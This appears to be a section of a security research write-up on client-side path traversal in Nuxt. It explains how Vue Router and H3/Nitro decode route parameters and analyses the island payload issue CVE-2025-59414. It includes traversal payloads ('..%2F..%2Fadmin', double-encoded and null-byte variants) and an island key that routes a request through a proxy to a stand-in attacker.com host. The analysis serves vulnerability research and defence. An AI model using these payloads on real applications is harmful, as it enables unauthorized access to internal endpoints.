# 03 - Encoding Behavior

## Full Decoding Pipeline

Nuxt has two distinct encoding pipelines: client-side (Vue Router) and server-side (H3/Nitro). Understanding both is critical for CSPT exploitation.

## Client-Side Pipeline (Vue Router 4.6.4)

### Step 1: Browser URL Normalization

The browser normalizes the URL before Vue Router sees it:
- `%2F` stays as `%2F` in `window.location.pathname`
- `%2f` stays as `%2f` (case preserved)
- `..` in path is NOT resolved by the browser in the fragment or after pushState

### Step 2: Vue Router URL Parsing

Vue Router's `createCurrentLocation()` extracts the path from `window.location`:

```javascript
// vue-router/dist/vue-router.mjs:16
function createCurrentLocation(base, location) {
  const { pathname, search, hash } = location;
  return stripBase(pathname, base) + search + hash;
}
```

This preserves the percent-encoding from the browser.

### Step 3: Route Matching

Vue Router's `tokensToParser()` compiles route patterns into regexes. For path params:
- Default pattern: `[^/]+?` (does NOT match `/`)
- Catch-all `(.*)`: matches everything including `/`

The regex match operates on the **encoded** URL path. A `%2F` does NOT match the `/` separator, so `%2F` in a normal param is included in the param value.

### Step 4: Parameter Decoding (THE CRITICAL STEP)

After matching, Vue Router applies `decodeParams()`:

```javascript
// vue-router/dist/vue-router.mjs:1172
const decodeParams = applyToParams.bind(null, decode);

// vue-router/dist/devtools-EWN81iOl.mjs:170
function decode(text) {
  if (text == null) return null;
  try {
    return decodeURIComponent("" + text);
  } catch (err) { }
  return "" + text;
}
```

This is applied to ALL matched params:

```javascript
// vue-router/dist/vue-router.mjs:1205
params: decodeParams(matchedRoute.params),
hash: decode(locationNormalized.hash),
```

**Result:** `route.params.*` values are fully decoded via `decodeURIComponent()`.

### Step 5: Catch-All Array Splitting

For catch-all routes (`[...slug]`), Vue Router:
1. Matches the full remaining path against `(.*)*`
2. Splits by `/` to create an array
3. Decodes each segment individually

So `/files/..%2Fetc/passwd` with catch-all:
- Match: `..%2Fetc/passwd`
- Split: `["..%2Fetc", "passwd"]`
- Decode each: `["../etc", "passwd"]`

### Step 6: Route Object Properties

| Property | Encoding State | Safe for URL Construction? |
|----------|---------------|---------------------------|
| `route.params.id` | DECODED | NO -- contains literal `../` |
| `route.path` | ENCODED (from URL) | Safer, but still percent-encoded |
| `route.fullPath` | ENCODED (path + query + hash) | Safer |
| `route.query.key` | DECODED (by Vue Router's parseQuery) | NO |
| `route.hash` | DECODED | NO |

### Step 7: useFetch / $fetch URL Processing

```javascript
// nuxt/dist/app/composables/fetch.js:64
return _$fetch(_request.value, { signal, ..._fetchOptions });
```

`$fetch` (from ofetch/unjs) processes the URL:
- If URL starts with `/`, it's treated as a relative path to the current origin
- The browser's `fetch()` API will resolve `../` sequences in the path
- No re-encoding or sanitization occurs in the Nuxt layer

**This is where the CSPT happens:** A decoded `route.params.id` containing `../../admin` flows through template literal into `/api/users/../../admin`, which the browser resolves to `/api/admin`.

## Server-Side Pipeline (H3 / Nitro)

### Step 1: HTTP Request Arrives

Node.js `http.IncomingMessage` provides `req.url` with the raw URL path. Percent-encoding is preserved.

### Step 2: H3 URL Parsing

H3 uses `ufo` library's `parseURL()` to parse the request URL:

```javascript
// h3/dist/index.mjs (via nitro)
const originalId = decodePath(
  withLeadingSlash(withoutTrailingSlash(parseURL(event.path).pathname))
);
```

Note: `decodePath` from ufo decodes the path for internal ID matching, but route params go through a different path.

### Step 3: Radix3 Route Matching

Nitro uses `radix3` router to match server routes. The matching happens on the URL path as-is.

### Step 4: Parameter Extraction

```javascript
// nitro.mjs:1911-1912
const params = match.matched.params || {};
event.context.params = params;
```

Parameters are extracted from the radix3 match. The radix3 router extracts param values from the URL segments **without decoding**.

### Step 5: getRouterParam()

```javascript
// h3/dist/index.mjs:252-268
function getRouterParams(event, opts = {}) {
  let params = event.context.params || {};
  if (opts.decode) {          // <-- ONLY decodes when explicitly requested
    params = { ...params };
    for (const key in params) {
      params[key] = decode(params[key]);  // ufo's decode = decodeURIComponent
    }
  }
  return params;
}

function getRouterParam(event, name, opts = {}) {
  const params = getRouterParams(event, opts);
  return params[name];
}
```

**Key finding:** `getRouterParam()` does NOT decode by default. The `decode` option must be explicitly passed as `{ decode: true }`.

### Step 6: Server-Side $fetch

When a server route uses `$fetch()` to call an internal service:
```javascript
const id = getRouterParam(event, 'id')  // NOT decoded by default
return $fetch(`http://internal/${id}`)
```

The `id` still contains percent-encoding. Whether this is exploitable depends on how the target service handles the encoded URL.

## CVE-2025-59414: Island Payload Revival

### The Payload Lifecycle

1. **Server renders** island component, stores result in `__NUXT__` payload with key like `ComponentName_hashValue`
2. **Client hydrates**, deserializes `__NUXT__` from inline script
3. **Payload reviver** processes island data:

```javascript
// revive-payload.client.js:17-32
revivers.push(["Island", ({ key, params, result }) => {
  const nuxtApp = useNuxtApp();
  if (!nuxtApp.isHydrating) {
    nuxtApp.payload.data[key] ||= $fetch(`/__nuxt_island/${key}.json`, {
      responseType: "json",
      ...params ? { params } : {}
    });
  }
  return { html: "", ...result };
}]);
```

### The CSPT Vector

If the `key` value can be controlled (via cache poisoning, XSS, or payload injection):

```
key = "../../api/users/1"
-> $fetch("/__nuxt_island/../../api/users/1.json")
-> Resolves to: /api/users/1.json
```

The `.json` suffix is appended, but this can be absorbed by a catch-all route or a query parameter:

```
key = "../../api/proxy/attacker.com?x="
-> $fetch("/__nuxt_island/../../api/proxy/attacker.com?x=.json")
-> Resolves to: /api/proxy/attacker.com?x=.json
```

### NuxtIsland Component Fetch

```javascript
// nuxt-island.js:189
const url = remoteComponentIslands && props.source
  ? joinURL(props.source, `/__nuxt_island/${key2}.json`)
  : `/__nuxt_island/${key2}.json`;
```

When `remoteComponentIslands` is enabled and `props.source` is set, the URL is constructed with `joinURL()` from `ufo`. The `joinURL` function does NOT sanitize traversal sequences -- it joins path segments with `/`.

## Encoding Comparison Table

| Input | Vue Router `route.params.id` | H3 `getRouterParam(event, 'id')` | H3 `getRouterParam(event, 'id', {decode:true})` |
|-------|------------------------------|----------------------------------|--------------------------------------------------|
| `/users/hello` | `"hello"` | `"hello"` | `"hello"` |
| `/users/hello%20world` | `"hello world"` | `"hello%20world"` | `"hello world"` |
| `/users/..%2F..%2Fadmin` | `"../../admin"` | `"..%2F..%2Fadmin"` | `"../../admin"` |
| `/users/..%252F..%252Fadmin` | `"..%2F..%2Fadmin"` | `"..%252F..%252Fadmin"` | `"..%2F..%2Fadmin"` |
| `/users/%00null` | `"\x00null"` | `"%00null"` | `"\x00null"` |
